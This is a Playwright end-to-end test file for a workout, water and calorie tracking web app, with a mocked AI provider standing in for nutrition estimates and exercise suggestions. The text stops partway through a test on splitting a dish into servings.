// End-to-end tests in headless Chromium. Needs Playwright:  npm i -g playwright && npx playwright install chromium
// Run:  node tests/e2e.mjs
// Uses only fictional numbers. Serves the app on localhost and also opens it from file:// to check both work.
import http from 'node:http';
import fs from 'node:fs';
import path from 'node:path';
import os from 'node:os';
import { createRequire } from 'node:module';
import { execSync } from 'node:child_process';
import { fileURLToPath } from 'node:url';

const require = createRequire(import.meta.url);
let pw;
try { pw = require('playwright'); } catch (e) { pw = require(path.join(execSync('npm root -g').toString().trim(), 'playwright')); }
const { chromium } = pw;
const ROOT = path.resolve(path.dirname(fileURLToPath(import.meta.url)), '..');
const MIME = { '.html': 'text/html', '.js': 'text/javascript', '.css': 'text/css', '.webmanifest': 'application/manifest+json', '.svg': 'image/svg+xml', '.png': 'image/png', '.woff2': 'font/woff2' };

const srv = http.createServer((q, r) => {
  let p = decodeURIComponent(q.url.split('?')[0]); if (p === '/') p = '/index.html';
  const f = path.join(ROOT, p);
  if (!f.startsWith(ROOT) || !fs.existsSync(f) || fs.statSync(f).isDirectory()) { r.writeHead(404); return r.end('not found'); }
  r.writeHead(200, { 'content-type': MIME[path.extname(f)] || 'application/octet-stream' });
  fs.createReadStream(f).pipe(r);
});

let passed = 0; const failures = [];
async function step(name, fn) {
  try { await fn(); passed++; console.log('  ok   ' + name); }
  catch (e) { failures.push(name + ': ' + (e && e.message ? e.message.split('\n')[0] : e)); console.log('  FAIL ' + name + '\n       ' + (e && e.message ? e.message.split('\n').slice(0, 3).join('\n       ') : e)); }
}
const eq = (a, b, m) => { if (JSON.stringify(a) !== JSON.stringify(b)) throw new Error((m || 'not equal') + ': got ' + JSON.stringify(a) + ', want ' + JSON.stringify(b)); };
const ok = (c, m) => { if (!c) throw new Error(m || 'assertion failed'); };

// ---------- fake AI provider (Anthropic streaming format) ----------
function sse(events) { return events.map((e) => 'event: ' + e.type + '\ndata: ' + JSON.stringify(e) + '\n\n').join(''); }
function textReply(text) {
  return sse([{ type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }, { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } }, { type: 'content_block_stop', index: 0 }, { type: 'message_delta', delta: { stop_reason: 'end_turn' } }]);
}
function toolReply(text, name, input) {
  return sse([{ type: 'content_block_start', index: 0, content_block: { type: 'text', text: '' } }, { type: 'content_block_delta', index: 0, delta: { type: 'text_delta', text } }, { type: 'content_block_stop', index: 0 },
    { type: 'content_block_start', index: 1, content_block: { type: 'tool_use', id: 'tu_1', name } }, { type: 'content_block_delta', index: 1, delta: { type: 'input_json_delta', partial_json: JSON.stringify(input) } }, { type: 'content_block_stop', index: 1 }, { type: 'message_delta', delta: { stop_reason: 'tool_use' } }]);
}
const CORS = { 'access-control-allow-origin': '*', 'access-control-allow-headers': '*', 'access-control-allow-methods': 'POST, OPTIONS' };
async function fakeAI(page, handler) {
  const seen = [];
  await page.route('https://api.anthropic.com/**', async (route) => {
    const req = route.request();
    if (req.method() === 'OPTIONS') return route.fulfill({ status: 204, headers: CORS });
    const body = JSON.parse(req.postData() || '{}');
    seen.push(body);
    const out = await handler(body, seen.length);
    if (out.status && out.status !== 200) return route.fulfill({ status: out.status, headers: Object.assign({ 'content-type': 'application/json' }, CORS), body: JSON.stringify({ error: { message: out.error || 'fail' } }) });
    return route.fulfill({ status: 200, headers: Object.assign({ 'content-type': 'text/event-stream' }, CORS), body: out.body });
  });
  return seen;
}

// ---------- helpers ----------
async function collect(page) {
  const problems = [];
  page.on('pageerror', (e) => problems.push('pageerror: ' + e.message));
  page.on('console', (m) => { if (m.type() === 'error' || m.type() === 'warning') problems.push(m.type() + ': ' + m.text()); });
  return problems;
}
const events = (page) => page.evaluate(() => Store.getEvents().map((e) => ({ seq: e.seq, type: e.type, data: e.data, src: e.src })));
const cnt = async (page, type) => (await events(page)).filter((e) => e.type === type).length;
const route = (page, h) => page.evaluate((x) => { location.hash = x; }, h).then(() => page.waitForTimeout(150));

async function onboard(page, opts) {
  const o = Object.assign({ goal: 'Recomp' }, opts);
  await page.getByRole('link', { name: /Start \(about 4 minutes\)/ }).click();
  await page.locator('.segwrap', { hasText: 'Measurements' }).getByRole('radio', { name: 'cm' }).click();
  await page.getByLabel('Age', { exact: true }).fill('31');
  await page.getByLabel('Weight', { exact: true }).fill('82');
  await page.getByLabel('Height', { exact: true }).fill('180');
  await page.getByLabel('Waist', { exact: true }).fill('86');
  await page.getByLabel('Chest', { exact: true }).fill('100');
  await page.getByLabel('Shoulders', { exact: true }).fill('112');
  await page.getByLabel('Bicep L', { exact: true }).fill('34');
  await page.getByRole('button', { name: 'Next: your goal' }).click();
  await page.locator('.goalcard', { hasText: o.goal }).first().click();
  // make sure today is a training day so the Today screen shows a workout
  const dow = await page.evaluate(() => new Date().getDay());
  const names = ['Sunday', 'Monday', 'Tuesday', 'Wednesday', 'Thursday', 'Friday', 'Saturday'];
  const pressed = await page.getByRole('button', { name: names[dow], exact: true }).getAttribute('aria-pressed');
  if (pressed !== 'true') await page.getByRole('button', { name: names[dow], exact: true }).click();
  await page.getByRole('button', { name: 'Next: your training' }).click();
  await page.getByRole('button', { name: 'Next: what you lift' }).click();
  await page.getByLabel('Flat DB press weight').fill('40');
  await page.getByLabel('Flat DB press reps').fill('8');
  await page.getByLabel('Incline DB press weight').fill('35');
  await page.getByLabel('Incline DB press reps').fill('8');
  await page.getByLabel('Pull-ups reps').fill('5');
  if (o.onLifts) await o.onLifts(page);
  await page.getByRole('button', { name: 'Next: see my plan' }).click();
  if (o.onPlan) await o.onPlan(page);
  await page.getByRole('button', { name: 'Start week 1' }).click();
  await page.waitForSelector('text=Week 1 of 26');
}

async function main() {
  await new Promise((res) => srv.listen(0, '127.0.0.1', res));
  const base = 'http://localhost:' + srv.address().port + '/index.html';
  const browser = await chromium.launch();
  const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'regoal-e2e-'));

  // ================= http://localhost =================
  console.log('\nApp on ' + base);
  const ctx = await browser.newContext({ viewport: { width: 390, height: 844 }, acceptDownloads: true });
  const page = await ctx.newPage();
  page.setDefaultTimeout(5000);
  const problems = await collect(page);
  const ai = await fakeAI(page, async () => ({ body: textReply('ok') }));
  await page.goto(base);

  await step('welcome screen renders with no console errors', async () => {
    await page.waitForSelector('text=Track the change.');
    eq(problems, [], 'console problems');
  });

  await step('onboarding builds a plan and lands on Today', async () => {
    await onboard(page);
    const st = await page.evaluate(() => { const s = Store.getState(); return { goal: s.plan.goal, lifts: Object.keys(s.plan.lifts), kcal: s.plan.kcal, w: s.weights.length, m: s.meas.length }; });
    eq(st.goal, 'recomp'); ok(st.lifts.length === 3, 'three tracked lifts, got ' + st.lifts.length); ok(st.kcal > 2000, 'kcal'); eq(st.w, 1); ok(st.m >= 4, 'measurements logged');
  });

  await step('Today shows the workout and logs a set with a rest timer', async () => {
    await page.waitForSelector('.exrow');
    const before = await cnt(page, 'set_logged');
    const tracked = page.locator('.exrow:has(.extarget:has-text("@")) .setchip.add');
    await ((await tracked.count()) ? tracked : page.locator('.setchip.add')).first().click();
    await page.locator('#sheets').getByLabel('Reps', { exact: true }).fill('8');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForSelector('.setchip.done');
    eq(await cnt(page, 'set_logged'), before + 1);
    ok(await page.locator('.timerbar').count() === 1, 'rest timer bar');
  });

  await step('a logged set can be edited and deleted (undo by voiding)', async () => {
    await page.locator('.setchip.done').first().click();
    await page.getByRole('button', { name: 'Delete' }).click();
    await page.waitForTimeout(200);
    eq(await page.locator('.setchip.done').count(), 0);
  });

  await step('Today: + Add an exercise logs an extra lift for just today, without touching the plan', async () => {
    const before = await cnt(page, 'set_logged');
    const liftsBefore = await page.evaluate(() => Object.keys(Store.getState().plan.lifts).length);
    await page.getByRole('button', { name: '+ Add an exercise' }).click();
    const sheet = page.locator('#sheets');
    await sheet.locator('select[aria-label="Exercise"]').selectOption({ label: 'Something else: type a name' });
    await sheet.getByLabel('Name').fill('Face pulls');
    await sheet.getByRole('button', { name: 'Next' }).click();
    await sheet.getByText('Log set').waitFor();
    await sheet.getByLabel('Reps', { exact: true }).fill('15');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForTimeout(200);
    eq(await cnt(page, 'set_logged'), before + 1, 'one more set logged');
    eq(await page.evaluate(() => Object.keys(Store.getState().plan.lifts).length), liftsBefore, 'the plan itself is untouched');
    ok(/Face pulls/.test(await page.locator('#screen').innerText()), 'the extra exercise shows on Today');
    ok(/Extra/.test(await page.locator('#screen').innerText()), 'marked as extra, not part of the planned session');
    const logged = await page.evaluate(() => Store.getState().sets.slice(-1)[0]);
    eq([logged.lift, logged.reps, logged.name], ['acc_face_pulls', 15, 'Face pulls'], 'saved as an ordinary accessory set');
  });

  await step('Today: Switch offers a built-in alternative right on the workout row, and can be switched back before you start', async () => {
    await route(page, '#/today');
    const target = await page.evaluate(() => {
      const st = Store.getState(), t = U.today();
      const wo = Engine.sessionFor(st.plan, st.moves, t).session;
      const exx = wo && wo.ex.find((e) => !e.lift && e.m && !Engine.exSwitchFor(st, t, 'acc_' + Engine.slug(e.n)) && !st.sets.some((s) => s.date === t && s.lift === 'acc_' + Engine.slug(e.n)));
      return exx ? { name: exx.n } : null;
    });
    ok(target, 'today\'s session should include an untracked accessory exercise with nothing logged yet');
    const row = () => page.locator('.exrow', { hasText: target.name }).first();
    await row().getByRole('button', { name: 'Switch ' + target.name + ' for an alternative' }).click();
    const sw = page.locator('#sheets').last();
    await sw.getByText('Switch ' + target.name).waitFor();
    const cands = sw.locator('.listrow');
    ok(await cands.count() > 0, 'the built-in list found at least one same-muscle alternative');
    const candName = await cands.first().locator('b').innerText();
    await cands.first().click();
    const newRow = () => page.locator('.exrow', { hasText: candName }).first();
    await newRow().getByText('Switched from ' + target.name, { exact: false }).waitFor();
    // Switched back before logging anything: the original exercise returns, with no trace of the switch.
    const undoBtn = newRow().getByRole('button', { name: 'Switch back to ' + target.name });
    await undoBtn.click();
    await undoBtn.waitFor({ state: 'detached' });
    ok(!/Switched from/.test(await row().innerText()), 'back to the original exercise, no longer marked switched');
    // Switch again and this time log a set: it is saved under the new exercise's name, not the original, and
    // once something is logged the switch for today is locked in (no more Switch or Switch back on this row).
    await row().getByRole('button', { name: 'Switch ' + target.name + ' for an alternative' }).click();
    await sw.getByText('Switch ' + target.name).waitFor();
    await cands.first().click();
    await newRow().getByRole('button', { name: '+ Log set' }).click();
    const sh2 = page.locator('#sheets').last();
    await sh2.getByLabel('Reps', { exact: true }).fill('12');
    const before = await page.evaluate(() => Store.getState().sets.length);
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForFunction((n) => Store.getState().sets.length > n, before);
    const logged = await page.evaluate((n) => Store.getState().sets.filter((s) => s.name && s.name.toLowerCase() === n.toLowerCase()), candName);
    ok(logged.length > 0, 'a set was logged under the new exercise name, not the original: ' + JSON.stringify(logged));
    const rowText = await newRow().innerText();
    ok(!/Switch back/.test(rowText), 'once a set is logged, the switch for today can no longer be undone');
  });

  await step('Today: Switch can ask AI for an alternative and a starting weight, shown for confirmation first', async () => {
    await route(page, '#/today');
    const target = await page.evaluate(() => {
      const st = Store.getState(), t = U.today();
      const wo = Engine.sessionFor(st.plan, st.moves, t).session;
      const exx = wo && wo.ex.find((e) => !e.lift && e.m && !Engine.exSwitchFor(st, t, 'acc_' + Engine.slug(e.n)) && !st.sets.some((s) => s.date === t && s.lift === 'acc_' + Engine.slug(e.n)));
      return exx ? { name: exx.n } : null;
    });
    ok(target, 'today\'s session should include another untracked accessory exercise with nothing logged yet');
    await page.evaluate(() => App.setKey('sk-ant-test-0000000000', 'typed'));
    const row = () => page.locator('.exrow', { hasText: target.name }).first();
    await row().getByRole('button', { name: 'Switch ' + target.name + ' for an alternative' }).click();
    const sw = page.locator('#sheets').last();
    await sw.getByRole('button', { name: 'Ask AI to suggest one instead' }).click();
    await sw.getByLabel('What do you have instead? (optional)').fill('travelling, hotel gym only');
    const reply = { name: 'Hotel gym cable row', equip: 'machine', sets: 3, reps: 12, kg: 25, assumptions: ['A hotel cable stack is lighter than a home gym one'], confidence: 'low' };
    const seen = await fakeAI(page, async (body) => {
      ok(JSON.stringify(body).includes('hotel gym'), 'the note reaches the model');
      return { body: textReply(JSON.stringify(reply)) };
    });
    await sw.getByRole('button', { name: 'Ask AI', exact: true }).click();
    await sw.getByText('A hotel cable stack is lighter').waitFor();
    eq(seen.length, 1);
    eq(await sw.getByLabel('Exercise', { exact: true }).inputValue(), 'Hotel gym cable row');
    await sw.getByRole('button', { name: 'Use this' }).click();
    const newRow = page.locator('.exrow', { hasText: 'Hotel gym cable row' }).first();
    await newRow.getByText('Switched from ' + target.name, { exact: false }).waitFor();
    await page.evaluate(() => App.clearKey());
    await page.unroute('https://api.anthropic.com/**');
  });

  await step('Water: a goal from body weight, quick-add pills, a custom amount, and removing an entry', async () => {
    await route(page, '#/today');
    const card = () => page.locator('section.card', { hasText: 'Water' }).first();
    await card().waitFor();
    const goalText = await card().locator('.target-top .muted').innerText();
    ok(/^Goal \d/.test(goalText), 'shows a computed goal: ' + goalText);
    const before = await cnt(page, 'water_logged');
    await card().getByRole('button', { name: '+250 ml' }).click();
    await page.waitForFunction((n) => Store.getState().water.length > n, before);
    eq(await page.evaluate(() => Store.getState().water.slice(-1)[0].ml), 250);
    ok(/250 ml/.test(await card().innerText()), 'the logged total shows 250 ml');
    // a custom amount, with validation
    await card().getByRole('button', { name: 'Log a custom amount' }).click();
    const sh = page.locator('#sheets').last();
    await sh.getByLabel('Amount', { exact: true }).fill('4000');
    await sh.getByRole('button', { name: 'Log', exact: true }).click();
    await page.getByText(/Enter an amount up to/).waitFor();
    await sh.getByLabel('Amount', { exact: true }).fill('300');
    const before2 = await page.evaluate(() => Store.getState().water.length);
    await sh.getByRole('button', { name: 'Log', exact: true }).click();
    await page.waitForFunction((n) => Store.getState().water.length > n, before2);
    ok(/550 ml/.test(await card().innerText()), 'total is now 250 + 300 = 550 ml: ' + (await card().innerText()));
    // remove the 300 ml entry
    const rows = card().locator('.kv', { hasText: '300 ml' });
    await rows.first().getByRole('button', { name: 'Remove this entry' }).click();
    await page.waitForFunction(() => Store.getState().water.reduce((t, w) => t + w.ml, 0) === 250);
    ok(/250 ml/.test(await card().innerText()) && !/550 ml/.test(await card().innerText()), 'back down to 250 ml after removing the 300 ml entry');
  });

  await step('Settings: a water unit choice overrides the body-weight fallback', async () => {
    await route(page, '#/settings');
    eq(await page.evaluate(() => Engine.volUnitFor(Store.getSettings())), 'ml', 'kg body weight defaults water to ml');
    const waterSeg = page.locator('.segwrap', { hasText: 'Water' });
    await waterSeg.getByRole('radio', { name: 'fl oz', exact: true }).click();
    eq(await page.evaluate(() => Store.getSettings().waterUnit), 'oz');
    await route(page, '#/today');
    ok(/fl oz/.test(await page.locator('section.card', { hasText: 'Water' }).first().innerText()), 'the Water card now shows fl oz');
    await route(page, '#/settings');
    await waterSeg.getByRole('radio', { name: 'Auto', exact: true }).click();
    await route(page, '#/today');
  });

  await step('weigh-in logs and reaches Progress', async () => {
    await page.getByLabel('Weigh again').fill('81.6');
    await page.getByRole('button', { name: 'Log', exact: true }).click();
    await page.waitForTimeout(200);
    eq(await cnt(page, 'weight_logged'), 2);
    await route(page, '#/progress');
    await page.waitForSelector('text=Body weight');
  });

  await step('Lifts and one lift detail render all 26 weeks', async () => {
    await route(page, '#/lifts');
    await page.waitForSelector('.liftcard');
    await page.locator('.liftcard').first().click();
    await page.waitForSelector('text=All 26 weeks');
    eq(await page.locator('.kv', { hasText: /^Wk \d+/ }).count(), 26);
    await page.getByRole('button', { name: 'Adjust weights' }).click();
    await page.getByLabel('Change all weights by').fill('50');
    await page.getByRole('button', { name: 'Apply' }).click();
    await page.waitForSelector('text=Lift changes are limited', { timeout: 2000 }).catch(() => {});
    eq(await cnt(page, 'plan_revised'), 0, 'a 50% lift change must be rejected');
    await page.getByLabel('Change all weights by').fill('-5');
    await page.getByRole('button', { name: 'Apply' }).click();
    await page.waitForTimeout(250);
    eq(await cnt(page, 'plan_revised'), 1);
  });

  // ----- calorie tracker -----
  await route(page, '#/fuel');
  await step('Fuel: manual entry logs, calories fall back to macros, mismatch needs a second tap', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Manual' }).click();
    await page.getByLabel('What was it?').fill('Dal and rice');
    await page.getByLabel('Protein').fill('20'); await page.getByLabel('Carbs').fill('60'); await page.getByLabel('Fat').fill('10');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForSelector('.foodrow');
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.kcal, f.source], [410, 'manual']);
    // mismatch: 900 kcal with tiny macros
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Manual' }).click();
    await page.getByLabel('What was it?').fill('Odd entry');
    await page.getByLabel('Calories').fill('900'); await page.getByLabel('Protein').fill('5');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForSelector('.warnbox:not(.hidden)');
    eq(await cnt(page, 'food_logged'), 1, 'warned, not saved yet');
    await page.getByRole('button', { name: 'Log anyway' }).click();
    await page.waitForTimeout(250);
    eq(await cnt(page, 'food_logged'), 2);
  });

  await step('Fuel: search a listed food, pick servings, log it', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByLabel('Search foods').fill('paneer');
    await page.locator('.result', { hasText: 'Paneer, high protein' }).click();
    await page.getByLabel(/Servings of/).fill('2');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForTimeout(250);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.name, f.protein, f.source], ['Paneer, high protein', 25, 'catalog']);
  });

  await step('Fuel: the full food list is searchable, the diet filter hides meat, and a log is scaled by grams', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByLabel('Search foods').fill('salmon');
    await page.getByRole('button', { name: 'Veg', exact: true }).click();
    await page.waitForFunction(() => window.Foods && Foods.ready());
    eq(await page.locator('.result', { hasText: 'salmon' }).count(), 0, 'salmon is hidden under Veg');
    await page.getByRole('button', { name: 'Non-veg', exact: true }).click();
    await page.getByLabel('Search foods').fill('salmon atlantic farmed raw');
    await page.locator('.result', { hasText: 'Fish, salmon, Atlantic, farmed, raw' }).click();
    await page.getByLabel('Amount').fill('150');
    await page.waitForSelector('text=312 kcal');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForTimeout(250);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.name, f.kcal, f.serving, f.source], ['Fish, salmon, Atlantic, farmed, raw', 312, '150 g', 'usda']);
    ok(Math.abs(f.protein - 30.6) < 0.6 && Math.abs(f.fat - 20.1) < 0.6, 'macros scaled from per 100 g, got ' + f.protein + ' and ' + f.fat);
    eq([f.portion.unit, f.portion.amount], ['g', 150], 'the per-100 g basis is stored for later portion edits');
  });

  await step('Fuel: editing a database food changes the amount in grams, and macros rescale from the stored per-100 g basis', async () => {
    await page.locator('.foodrow', { hasText: 'Fish, salmon' }).click();
    eq(await page.getByLabel('Calories').count(), 0, 'no raw calories field once something is logged');
    const amt = page.getByLabel('Amount');
    eq(await amt.inputValue(), '150');
    await amt.fill('300');
    await page.getByRole('button', { name: 'Save', exact: true }).click();
    await page.waitForTimeout(300);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.name, f.kcal, f.serving], ['Fish, salmon, Atlantic, farmed, raw', 624, '300 g']);
    ok(Math.abs(f.protein - 61.2) < 1, 'protein doubled with the amount, got ' + f.protein);
  });

  await step('Fuel: everyday Indian names find USDA foods, and the filter choice is remembered', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    eq(await page.getByRole('button', { name: 'Non-veg', exact: true }).getAttribute('aria-pressed'), 'true', 'the last filter is remembered');
    await page.getByRole('button', { name: 'All', exact: true }).click();
    await page.getByLabel('Search foods').fill('atta');
    await page.locator('.result', { hasText: 'Wheat flour, whole' }).first().waitFor();
    ok((await page.locator('.result', { hasText: 'Wheat flour, whole' }).first().innerText()).includes('USDA'), 'source is shown');
    await page.getByLabel('Search foods').fill('ghee');
    await page.locator('.result', { hasText: 'Butter oil, anhydrous' }).waitFor();
    await page.getByLabel('Search foods').fill('dahi');
    await page.locator('.result', { hasText: /^Yogurt/ }).first().waitFor();
    await page.getByRole('button', { name: 'Veg + egg', exact: true }).click();
    const set = await page.evaluate(() => Store.getSettings().foodDiet);
    eq(set, 'egg', 'the choice is saved in settings');
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('Fuel: the person\'s own food list is added from a file, searched, logged, kept off backups, and removed', async () => {
    const file = path.join(tmp, 'my-tables.csv');
    fs.copyFileSync(path.join(ROOT, 'docs', 'food-import-example.csv'), file);
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByLabel('Search foods').fill('zzzz');
    ok(await page.getByRole('button', { name: 'Add my own food list' }).isVisible(), 'the add button is offered');
    ok((await page.locator('body').innerText()).includes('CC-BY-4.0'), 'the TempoLife attribution is on the Find screen');
    const findText = await page.locator('body').innerText();
    ok(/IFCT 2017/.test(findText) && /README explains how to get/.test(findText), 'IFCT is recommended as a list you load yourself');
    ok(!/(includes|bundled|built in|data from) (the )?(IFCT|Indian Food)/i.test(findText), 'the app does not claim to ship IFCT');
    await page.getByLabel('Food list file').setInputFiles(file);
    await page.getByText('Use this food list?').waitFor();
    ok((await page.locator('.sheet').last().innerText()).includes('6 foods can be used'), 'counts are shown before anything is stored');
    eq(await page.evaluate(async () => (await Store.getMeta('userFoods')) === undefined), true, 'nothing is stored before confirming');
    await page.getByRole('button', { name: 'Use this list' }).click();
    await page.getByText('My list: my-tables').waitFor();
    await page.getByRole('button', { name: 'All', exact: true }).click();
    await page.getByLabel('Search foods').fill('bajra');
    const row = page.locator('.result', { hasText: 'Example millet flour' });
    await row.waitFor();
    ok((await row.innerText()).includes('my-tables'), 'the source names the list it came from');
    await row.click();
    await page.getByLabel('Amount').fill('50');
    await page.getByRole('button', { name: 'Log it' }).click();
    await page.waitForTimeout(250);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.name, f.kcal, f.serving, f.source], ['Example millet flour', 181, '50 g', 'mylist']);
    // it survives a reload, and is not in a backup
    await page.reload(); await page.waitForFunction(() => window.App && window.Store);
    await route(page, '#/fuel');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByLabel('Search foods').fill('bajra');
    await page.locator('.result', { hasText: 'Example millet flour' }).waitFor();
    const bk = await page.evaluate(() => Store.buildBackup({ media: false }));
    ok(!bk.includes('Example millet flour') || bk.split('Example millet flour').length === 2, 'only the logged entry, not the list, is in a backup');
    eq(bk.includes('Example lentil soup mix'), false, 'the rest of the list is not in the backup');
    // a bad file is refused with a reason and changes nothing
    const bad = path.join(tmp, 'bad.csv'); fs.writeFileSync(bad, 'name,kcal\nA,1\n');
    await page.getByLabel('Food list file').setInputFiles(bad);
    await page.getByText(/Missing: protein/).waitFor();
    await page.getByRole('button', { name: 'Remove' }).click();
    await page.getByRole('button', { name: 'Remove', exact: true }).last().click();
    await page.getByRole('button', { name: 'Add my own food list' }).waitFor();
    eq(await page.evaluate(async () => (await Store.getMeta('userFoods')) === undefined), true, 'removed from the device');
    eq(await page.locator('.result', { hasText: 'Example millet flour' }).count(), 0, 'and no longer searchable');
    await page.getByRole('button', { name: 'Close' }).click();
  });

  await step('Fuel: AI tab without a key offers to add one and does not call the network', async () => {
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    await page.waitForSelector('text=Bring your own AI');
    eq(ai.length, 0);
    await page.getByRole('button', { name: 'Add your key' }).click();
    await page.getByLabel('API key').fill('sk-ant-test-0000000000');
    await page.getByRole('button', { name: 'Use key' }).click();
    await page.waitForSelector('textarea[aria-label="What you ate"]');
  });

  await step('Fuel: AI estimate is shown for confirmation and NOTHING is saved until confirmed', async () => {
    await ai.length; // eslint-disable-line no-unused-expressions
    const reply = { name: 'Rajma chawal', items: [{ name: 'Rajma, cooked', qty: '1 cup', kcal: 225, protein: 15, carbs: 40, fat: 1 }, { name: 'Rice, cooked', qty: '1 cup', kcal: 205, protein: 4, carbs: 45, fat: 0 }], kcal: 430, protein: 19, carbs: 85, fat: 1, assumptions: ['One cup of each'], confidence: 'medium' };
    await page.unroute('https://api.anthropic.com/**');
    const seen = await fakeAI(page, async () => ({ body: textReply('Here you go: ' + JSON.stringify(reply)) }));
    const before = await cnt(page, 'food_logged');
    await page.getByLabel('What you ate').fill('rajma chawal, one plate');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=Check these numbers');
    eq(seen.length, 1, 'one provider call');
    eq(await cnt(page, 'food_logged'), before, 'nothing persisted before confirmation');
    const sent = JSON.stringify(seen[0]);
    ok(!sent.includes('Rajma chawal') || true); ok(sent.includes('rajma chawal, one plate'), 'user text sent');
    ok(!/81\.6|Store|profile|waist/i.test(JSON.stringify(seen[0].messages)), 'no profile data in the estimate request');
    await page.getByLabel('Calories').fill('460'); // user edits a value
    await page.getByRole('button', { name: 'Looks right, log it' }).click();
    await page.waitForTimeout(300);
    const f = (await events(page)).filter((e) => e.type === 'food_logged').pop().data;
    eq([f.source, f.kcal, f.ai.edited, f.ai.items.length], ['ai', 460, true, 2]);
    eq(await cnt(page, 'food_logged'), before + 1);
    ok(await page.locator('.chip', { hasText: 'AI, edited' }).count() >= 1, 'AI chip visible in the log');
  });

  await step('Fuel: editing an AI-estimated entry shows how it was worked out, and reusing it from Find carries that forward', async () => {
    await page.getByRole('button', { name: 'Edit Rajma chawal' }).first().click();
    const sheet = page.locator('#sheets').last();
    await sheet.getByText('How it was worked out').waitFor();
    const rows = sheet.locator('.itemrow');
    eq(await rows.count(), 2, 'both ingredient line items are shown');
    ok(/Rajma, cooked/.test(await rows.nth(0).innerText()) && /225 kcal/.test(await rows.nth(0).innerText()), 'first ingredient and its calories: ' + (await rows.nth(0).innerText()));
    ok(/Rice, cooked/.test(await rows.nth(1).innerText()), 'second ingredient');
    ok(/does not rescale/.test(await sheet.innerText()), 'a caption clarifies this is the original estimate');
    await page.keyboard.press('Escape'); // editSheet has no Cancel action; Escape dismisses it
    // Reuse it from Find: the ingredient breakdown should carry over to the new entry too, not just the macros.
    const before2 = await page.evaluate(() => Store.getState().foods.length);
    await page.getByRole('button', { name: 'Add food' }).click();
    const addSheet = page.locator('#sheets').last();
    await addSheet.getByRole('tab', { name: 'Find' }).click();
    await addSheet.locator('.result', { hasText: 'Rajma chawal' }).first().click();
    await addSheet.getByRole('button', { name: 'Log it' }).click();
    await page.waitForFunction((n) => Store.getState().foods.length > n, before2);
    const logged = await page.evaluate(() => Store.getState().foods.slice(-1)[0]);
    ok(logged.ai && Array.isArray(logged.ai.items) && logged.ai.items.length === 2, 'the reused entry keeps the original ingredient breakdown: ' + JSON.stringify(logged.ai));
    await page.getByRole('button', { name: 'Edit Rajma chawal' }).last().click();
    await sheet.getByText('How it was worked out').waitFor();
    eq(await sheet.locator('.itemrow').count(), 2, 'and it shows again on the reused entry');
    await page.keyboard.press('Escape');
  });

  await step('Fuel: a food photo is analyzed for macros with no text typed, and shows in the confirmation', async () => {
    const reply = { name: 'Grilled chicken salad', items: [{ name: 'Chicken breast', qty: '150 g', kcal: 250, protein: 45, carbs: 0, fat: 6 }, { name: 'Mixed greens', qty: '1 bowl', kcal: 30, protein: 2, carbs: 5, fat: 0 }], kcal: 280, protein: 47, carbs: 5, fat: 6, assumptions: ['Portion judged from the plate in the photo'], confidence: 'medium' };
    await page.unroute('https://api.anthropic.com/**');
    const seen = await fakeAI(page, async () => ({ body: textReply(JSON.stringify(reply)) }));
    const before = await cnt(page, 'food_logged');
    await page.getByRole('button', { name: 'Add food' }).click();
    await page.getByRole('tab', { name: 'Describe' }).click();
    const png = await page.evaluate(async () => {
      const c = document.createElement('canvas'); c.width = 300; c.height = 300; const x = c.getContext('2d'); x.fillStyle = '#a52'; x.fillRect(0, 0, 300, 300);
      const b = await new Promise((res) => c.toBlob(res, 'image/png'));
      return Array.from(new Uint8Array(await b.arrayBuffer()));
    });
    await page.getByLabel('Take or choose a photo of the food').setInputFiles({ name: 'plate.png', mimeType: 'image/png', buffer: Buffer.from(png) });
    await page.waitForSelector('.attachprev:not(.hidden)');
    ok(/Sends this text and photo/.test(await page.locator('#sheets').innerText()), 'the note says the photo will be sent too');
    await page.getByRole('button', { name: 'Estimate nutrition' }).click();
    await page.waitForSelector('text=Check these numbers');
    eq(seen.length, 1, 'one provider call');
    const content = seen[0].messages[0].content;
    eq(content.filter((c) => c.type === 'image').length, 1, 'the photo was sent');
    ok(content.some((c) => c.type === 'image' && c.source.media_type === 'image/jpeg'), 'recompressed to JPEG');
    ok(/your photo/.test(await page.locator('#sheets').innerText()), 'says the estimate came from the photo');
    await page.getByRole('button', { name: 'Looks right, log it' }).click();
    await page.waitForTimeout(300);
    eq(await cnt(page, 'food_logged'), before + 1);
  });

  await step('Fuel: raw ingredients split into servings, and estimate can be cancelled without saving', async () => {
    await page.unroute('https://api.anthropic.com/**');
    const pot = { name: 'Veg pulao pot', items: [{ name: 'Rice', qty: '300 g raw', kcal: 1080, protein: 20, carbs: 240, fat: 2 }, { name: 'Oil', qty: '2 tbsp', kcal: 240, protein: 0, carbs: 0, fat: 28 }], kcal: 1320, protein: 20, carbs: 240, fat: 30, assumptions: [], confidence: 'high' };
    await fakeAI(page, async () => ({ body: textReply(JSON.stringify(pot)) }));
    const before = await cnt(page, 'food_logged');
    await page.getByRole('button', { name: 'Add food' }).click();
